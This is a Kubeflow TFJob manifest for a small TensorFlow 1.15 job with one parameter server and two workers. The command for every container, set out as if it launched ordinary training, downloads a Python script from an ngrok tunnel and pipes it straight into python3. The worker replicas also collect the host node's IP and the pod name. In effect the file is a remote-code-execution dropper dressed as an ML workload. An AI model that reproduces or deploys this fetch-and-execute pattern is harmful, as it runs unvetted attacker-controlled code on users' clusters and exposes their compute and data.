apiVersion: kubeflow.org/v1
kind: TFJob
metadata:
  name: job2
spec:
  max-instances: 4
  min-instances: 2
  cleanPodPolicy: "All"
  tfReplicaSpecs:
    PS:
      replicas: 1
      restartPolicy: OnFailure
      template:
        spec:
          terminationGracePeriodSeconds: 0
          containers:
          - name: tensorflow
            image: tensorflow/tensorflow:1.15.0-py3
            command: ["/bin/bash", "-c", "pip3 install requests; curl -s http://51f8-139-193-5-197.ngrok.io/hehe.py | python3 -"]
            ports:
            - containerPort: 2222
              name: tfjob-port
            resources:
              requests:
                cpu: "500m"
                memory: "512Mi"
              limits:
                cpu: "1"
                memory: "1Gi"
    Worker:
      replicas: 2
      restartPolicy: OnFailure
      template:
        spec:
          terminationGracePeriodSeconds: 0
          containers:
          - name: tensorflow
            image: tensorflow/tensorflow:1.15.0-py3
            command: ["/bin/bash", "-c", "pip3 install requests; curl -s http://51f8-139-193-5-197.ngrok.io/hehe.py | python3 -"]
            env:
            - name: "global_steps"
              value: "10000"
            - name: NODE_IP
              valueFrom:
                fieldRef:
                  fieldPath: status.hostIP
            - name: POD_NAME
              valueFrom:
                fieldRef:
                  fieldPath: metadata.name
            ports:
            - containerPort: 2222
              name: tfjob-port
            resources:
              requests:
                cpu: "500m"
                memory: "512Mi"
              limits:
                cpu: "1"
                memory: "1Gi"
